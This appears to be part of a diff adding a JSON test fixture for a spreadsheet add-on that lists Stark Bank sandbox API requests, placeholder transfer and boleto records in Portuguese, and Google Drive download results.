+     "before": "2024-03-31",
+     "cursor": "2"
+    },
+    "payload": ""
+   },
+   {
+    "method": "GET",
+    "path": "/boleto-payment",
+    "query": {
+     "after": "2024-03-01",
+     "before": "2024-03-31"
+    },
+    "payload": ""
+   }
+  ],
+  "messages": [],
+  "alerts": [],
+  "dialogs": [],
+  "logs": [],
+  "driveFiles": [],
+  "outcomes": [
+   {
+    "name": "ViewTransfer"
+   },
+   {
+    "name": "ViewCharge"
+   },
+   {
+    "name": "ViewChargePayment"
+   },
+   {
+    "name": "getTransferDownloadList",
+    "result": [
+     5001
+    ]
+   },
+   {
+    "name": "getChargeDownloadList",
+    "result": [
+     6001,
+     6002,
+     6003
+    ]
+   },
+   {
+    "name": "getChargePaymentDownloadList",
+    "result": [
+     4001
+    ]
+   }
+  ]
+ },
+ "driveDownloads": {
+  "cells": {
+   "Credentials": [
+    "1,1|t|Workspace",
+    "1,2|t|myworkspace",
+    "2,1|t|E-mail",
+    "2,2|t|User+tag@Example.com",
+    "3,1|t|Environment",
+    "3,2|t|sandbox",
+    "5,1|t|Member name",
+    "5,2|t|myworkspace",
+    "6,1|t|Workspace ID",
+    "6,2|n|5"
+   ],
+   "paymentRequestExternal": [
+    "1,3|t|{\"transfer\": [], \"boleto\": []}"
+   ],
+   "Consulta de Transferência": [
+    "10,1|t|Data de Criação",
+    "10,2|t|Id Transferência",
+    "10,3|t|Valor",
+    "10,4|t|Status",
+    "10,5|t|Nome",
+    "10,6|t|CPF/CNPJ",
+    "10,7|t|Código do Banco",
+    "10,8|t|Agência",
+    "10,9|t|Número da Conta",
+    "10,10|t|Ids de Transação (Saída, Estorno)",
+    "11,1|t|2024-03-05",
+    "11,2|n|5001",
+    "11,3|n|1234.56",
+    "11,4|t|sucesso",
+    "11,5|t|José da Silva & Filhos Ltda",
+    "11,6|t|012.345.678-90",
+    "11,7|n|341",
+    "11,8|n|1234",
+    "11,9|t|12345-6",
+    "11,10|t|t1,t2",
+    "12,1|t|2024-03-04",
+    "12,2|n|5002",
+    "12,3|n|0.5",
+    "12,4|t|processando",
+    "12,5|t|Loja do Zé (matriz)",
+    "12,6|t|12.345.678/0001-90",
+    "12,7|n|20018183",
+    "12,8|n|1",
+    "12,9|t|9-9",
+    "13,1|t|2024-03-05",
+    "13,2|n|5003",
+    "13,3|n|10000",
+    "13,4|t|falha",
+    "13,5|t|+55 (11) 99999-9999",
+    "13,6|n|98765432100",
+    "13,7|n|1",
+    "13,8|n|4321",
+    "13,9|n|1",
+    "13,10|t|t9"
+   ],
+   "Consulta de Boleto": [
+    "10,1|t|Data de Emissão",
+    "10,2|t|Nome",
+    "10,3|t|CPF/CNPJ",
+    "10,4|t|Status",
+    "10,5|t|Valor",
+    "10,6|t|Vencimento",
+    "10,7|t|Linha digitável",
+    "10,8|t|Id Boleto",
+    "10,9|t|Tarifa",
+    "10,10|t|Tags",
+    "10,11|t|Link PDF",
+    "11,1|t|2024-03-05",
+    "11,2|t|Maria O'Brien",
+    "11,3|t|012.345.678-90",
+    "11,4|t|registrado",
+    "11,5|n|150",
+    "11,6|t|2024-04-09",
+    "11,7|t|34191.09008 61207.727808 71444.640008 5 91990000015000",
+    "11,8|n|6001",
+    "11,9|n|2",
+    "11,10|t|loja,sp",
+    "11,11|f|=HYPERLINK(\"https://sandbox.api.starkbank.com/v2/boleto/6001/pdf\", \"PDF\")",
+    "12,1|t|2024-03-04",
+    "12,2|t|Empresa 100% Brasil",
+    "12,3|t|12.345.678/0001-90",
+    "12,4|t|pago",
+    "12,5|n|0.99",
+    "12,6|t|2024-04-10",
+    "12,8|n|6002",
+    "12,9|n|0",
+    "12,11|f|=HYPERLINK(\"https://sandbox.api.starkbank.com/v2/boleto/6002/pdf\", \"PDF\")",
+    "13,1|t|2024-03-05",
+    "13,2|t|@handle e 'aspas' \"duplas\"",
+    "13,3|n|98765432100",
+    "13,4|t|vencido",
+    "13,5|n|25",
+    "13,6|t|2023-12-31",
+    "13,7|n|0",
+    "13,8|n|6003",
+    "13,9|n|0.01",
+    "13,10|t|a,b,c",
+    "13,11|f|=HYPERLINK(\"https://sandbox.api.starkbank.com/v2/boleto/6003/pdf\", \"PDF\")"
+   ],
+   "Consulta de Pagamento Boleto": [
+    "10,1|t|Data de Criação",
+    "10,2|t|Id Pagamento",
+    "10,3|t|Valor",
+    "10,4|t|Status",
+    "10,5|t|Data de Agendamento",
+    "10,6|t|Linha Digitável",
+    "10,7|t|Descrição",
+    "10,8|t|Tags",
+    "11,1|t|2024-03-05",
+    "11,2|n|4001",
+    "11,3|n|150",
+    "11,4|t|sucesso",
+    "11,5|t|2024-04-09",
+    "11,6|t|34191.09008 61207.727808",
+    "11,7|t|Pagamento de boleto A",
+    "11,8|t|loja",
+    "12,1|t|2024-03-04",
+    "12,2|n|4002",
+    "12,3|n|0.99",
+    "12,4|t|processando",
+    "12,5|t|2024-04-10",
+    "12,6|n|190.00009",
+    "12,7|t|O'Brien & Filhos"
+   ]
+  },
+  "requests": [
+   {
+    "method": "GET",
+    "path": "/transfer/5001/pdf",
+    "query": {},
+    "payload": ""
+   },
+   {
+    "method": "GET",
+    "path": "/boleto/6001/pdf",
+    "query": {},
+    "payload": ""
+   },
+   {
+    "method": "GET",
+    "path": "/boleto/6002/pdf",
+    "query": {},
+    "payload": ""
+   },
+   {
+    "method": "GET",
+    "path": "/boleto/6003/pdf",
+    "query": {},
+    "payload": ""
+   },
+   {
+    "method": "GET",
+    "path": "/boleto-payment/4001/pdf",
+    "query": {},
+    "payload": ""
+   }
+  ],
+  "messages": [
+   "Arquivos baixados para Google Drive na pasta starkbank/transfer",
+   "Arquivos baixados para Google Drive na pasta starkbank/boleto",
+   "Arquivos baixados para Google Drive na pasta starkbank/boleto-payment"
+  ],
+  "alerts": [],
+  "dialogs": [],
+  "logs": [],
+  "driveFiles": [
+   {
+    "folder": "root/starkbank/transfer",
+    "content": "{\"pdf\":\"/transfer/5001/pdf\"}",
+    "name": "5001.pdf"
+   },
+   {
+    "folder": "root/starkbank/boleto",
+    "content": "{\"pdf\":\"/boleto/6001/pdf\"}",
+    "name": "6001.pdf"
+   },
+   {
+    "folder": "root/starkbank/boleto",
+    "content": "{\"pdf\":\"/boleto/6002/pdf\"}",
+    "name": "6002.pdf"
+   },
+   {
+    "folder": "root/starkbank/boleto",
+    "content": "{\"pdf\":\"/boleto/6003/pdf\"}",
+    "name": "6003.pdf"
+   },
+   {
+    "folder": "root/starkbank/boleto-payment",
+    "content": "{\"pdf\":\"/boleto-payment/4001/pdf\"}",
+    "name": "4001.pdf"
+   }
+  ],
+  "outcomes": [
+   {
+    "name": "TransferDownloadAllDrive"
+   },
+   {
+    "name": "ChargeDownloadAllDrive"
+   },
+   {
+    "name": "ChargePaymentDownloadAllDrive"
+   }
+  ]
+ }
+}
